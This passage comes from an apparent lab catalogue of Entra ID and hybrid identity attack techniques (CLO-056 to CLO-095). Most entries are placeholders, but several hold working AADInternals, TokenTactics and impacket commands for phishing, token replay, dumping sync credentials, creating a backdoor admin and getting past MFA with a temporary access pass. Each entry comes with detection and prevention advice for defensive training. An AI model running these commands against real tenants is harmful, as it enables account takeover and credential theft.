**Prevention:** Audit API permissions regularly. Restrict access to Service Principal owner configurations.

---

### CLO-056 — Service Principal Owner Hijacking
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-057 — Service Principal Role Assignment Abuse
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-058 — Enterprise Application Credentials Theft
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-059 — Admin Consent Bypass on Service Principal
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-060 — Service Principal Certificate Mismanagement
**What it is:** Reserved service principal and admin consent surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-061 — Conditional Access Policy Bypass Techniques
**What it is:** Bypassing CA policies using legacy auth protocols, device compliance spoofing, or location manipulation.
**Why it works here:** CA policies configured with exceptions or missing legacy auth blocking.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Invoke-AADIntPhishing -Recipients luke.skywalker@empire.local -Subject "Password Reset" -LinkText "Reset Password" -Sender "it@empire.local"
```
**Detection:** Anomalous sign-ins marked as successful CA verification from unrecognized IPs.
**Prevention:** Ensure CA policies block legacy auth, enforce compliant devices, and restrict exceptions.

---

### CLO-062 — Legacy Authentication Allowed for Guest Accounts
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-063 — MFA Registration Policy Bypass
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-064 — Trusted Location Spoofing
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-065 — Device Compliance Bypass via Header Injection
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-066 — Conditional Access Exception Group Abuse
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-067 — Device State Policy Bypass
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-068 — External Identity B2B Policy Bypass
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-069 — Conditional Access Policy Disabled / Not Enforced
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-070 — MFA Fatigue (Push Notification Spam)
**What it is:** Reserved Conditional Access policy logic surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-071 — Azure Token Theft and Replay
**What it is:** Access and refresh tokens cached locally on developer endpoints can be extracted and replayed offline.
**Why it works here:** CLI or PowerShell caches tokens in local profiles.
**Tools:** `TokenTactics`.
**Steps:**
```powershell
Invoke-RefreshToMSGraphToken -RefreshToken <rt> -tenantid <tid>
```
**Detection:** Graph API operations performed using stolen tokens from unrecognized external networks.
**Prevention:** Enforce short session lifetimes and use Continuous Access Evaluation (CAE).

---

### CLO-072 — Refresh Token Theft from Storage
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-073 — Session Hijacking via Stolen Cookie
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-074 — Access Token Extraction from Memory
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-075 — FOCI (Family of Client IDs) Token Abuse
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-076 — Graph API Token Exfiltration
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-077 — Azure Resource Manager (ARM) Token Theft
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-078 — Token Replay via Compromised API Gateway
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-079 — Azure CLI Token Cache Extraction
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-080 — SSO Cookie Replay
**What it is:** Reserved access/refresh token caching and transmission surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-081 — On-Prem → Cloud Escalation Chain
**What it is:** Full escalation chain moving from Active Directory compromise to hybrid synchronization decryption to global tenant takeover.
**Why it works here:** AD Sync decryption keys are readable by Domain Administrator.
**Tools:** `impacket-secretsdump`, `AADInternals`.
**Steps:**
```bash
impacket-secretsdump EMPIRE/MSOL_sync:EntraSync2024!@10.10.0.10
# Retrieve credentials using AADInternals:
Get-AADIntSyncCredentials -Server coruscant.empire.local
# Authenticate to Azure AD:
Connect-AzureAD -TenantId <tenant_id> -AccountId admin@corplab.onmicrosoft.com
```
**Detection:** Exporting sync database encryption keys or reading sensitive sync secrets.
**Prevention:** Enforce strict Tier 0 separation on the sync server and limit sync account privileges.

---

### CLO-082 — ADSync Encryption Bypass
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-083 — On-Premises AD CS ADCS Integration Abuse
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-084 — Azure AD Connect Health Agent Privilege Escalation
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-085 — Federated Domain Backdoor (Active Directory Federation Services)
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-086 — SAML Token Forgery (Golden SAML)
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-087 — ADFS Certificate Private Key Theft
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-088 — ADFS Trust Relationship Manipulation
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-089 — Hybrid Identity Writeback Abuse
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-090 — Azure Arc Server Identity Theft
**What it is:** Reserved cross-forest and hybrid escalation path surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-091 — AADInternals Toolkit Attacks / Kill AD sync
**What it is:** Abusing administrative permissions to disable Pass-Through Authentication or disrupt synchronization services via AADInternals.
**Why it works here:** Sync admin credentials compromised.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Set-AADIntPassThroughAuthenticationEnabled -Enabled $false
```
**Detection:** Audit events indicating disabling of PTA or sync status changes.
**Prevention:** Restrict Hybrid Identity Administrator role assignments.

---

### CLO-092 — Create backdoor admin user in Entra ID
**What it is:** Creating administrative accounts using compromised synchronization credentials to establish persistence.
**Why it works here:** Compromised write permission over the tenant directory.
**Tools:** `AADInternals`.
**Steps:**
```powershell
New-AADIntUser -UserPrincipalName backdoor@corplab.onmicrosoft.com -Password BackdoorPwd1 -DisplayName Backdoor -UserType Member
```
**Detection:** Creation of cloud-only administrative accounts without matching on-premises sync events.
**Prevention:** Enforce strict tenant user creation guidelines and alert on cloud-only admin creations.

---

### CLO-093 — Set temporary access pass (bypass MFA)
**What it is:** Registering a Temporary Access Pass (TAP) on a victim's account to bypass Multi-Factor Authentication.
**Why it works here:** Administrative access to user authentication methods.
**Tools:** `AADInternals`.
**Steps:**
```powershell
New-AADIntUserTemporaryAccessPass -UserPrincipalName victim@corplab.onmicrosoft.com
```
**Detection:** Audit logs showing addition of Temporary Access Pass authentication methods.
**Prevention:** Restrict and monitor TAP policy configurations and assignments.

---

### CLO-094 — Extract Entra ID join device certificates
**What it is:** Extracting device registration certificates for hybrid-joined endpoints to simulate trusted connections.
**Why it works here:** Read access allowed to device registration objects.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Get-AADIntHybridDeviceCertificate
```
**Detection:** Directory queries requesting hybrid device certificate objects.
**Prevention:** Harden on-premises storage of device configuration values.

---

### CLO-095 — Pass-the-PRT
**What it is:** Using a stolen Primary Refresh Token (PRT) to request access tokens, maintaining persistence without MFA.
**Why it works here:** PRT token stolen from CloudAP cache.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Get-AADIntPRTToken -DeviceID <id> -Certificate <cert>
```
**Detection:** Successful logins using token signatures not matching local device telemetry.
**Prevention:** Enforce device compliance and restrict token lifetimes.
